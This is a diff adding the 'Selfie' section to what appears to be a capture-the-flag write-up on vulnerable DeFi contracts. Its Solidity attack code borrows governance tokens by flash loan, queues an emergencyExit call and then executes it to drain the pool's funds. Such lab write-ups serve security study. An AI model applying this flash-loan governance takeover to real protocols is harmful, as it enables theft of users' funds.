@@ -99,3 +99,38 @@ To exploit this vulnerability, we aim to claim the most rewards in the upcoming 
         liquidityToken.transfer(address(flashPool), amount);
     }
 ```
+## 6. Selfie
+The vulnerability lies in the `SimpleGovernance` contract's mechanism for queuing actions based on the number of votes rather than any additional security checks. This means that any user with sufficient voting power can queue an action within the `SimpleGovernance` contract, regardless of their intentions or the potential impact on the system. Specifically, critical functions like function `emergencyExit()` can be called, leaving the contract vulnerable to fund drains.
+```solidity
+ function emergencyExit(address receiver) external onlyGovernance {
+        uint256 amount = token.balanceOf(address(this));
+        token.transfer(receiver, amount);
+
+        emit FundsDrained(receiver, amount);
+    }
+```
+### Solution
+To exploit this vulnerability, we utilize the flash loan feature provided by the `SelfiePool` contract to borrow a significant amount of governance tokens (`function attack1()`). These tokens grant us the necessary voting power to queue an action within the `SimpleGovernance` contract. Once the action is queued, it remains in a pending state for 2 days (`function attack2()`), after that time it can be executed. This allows us to do harmful actions within the governance system, such as draining funds.
+```solidity
+ function attack1()external{
+
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), INITIAL_SUPPLY_POOL, abi.encodeWithSignature("emergencyExit(address)", address(this)));
+    
+    }
+
+    function attack2()external{
+
+        governance.executeAction(actionID);
+    
+    }
+
+    function onFlashLoan(address _address,address _token, uint256 _value, uint256 zero, bytes memory data)external returns(bytes32){
+        
+        token.snapshot();
+        token.approve(address(pool), _value);
+
+        actionID= governance.queueAction(address(pool), uint128(zero), data);
+
+        return CALLBACK_SUCCESS;
+    }
+```
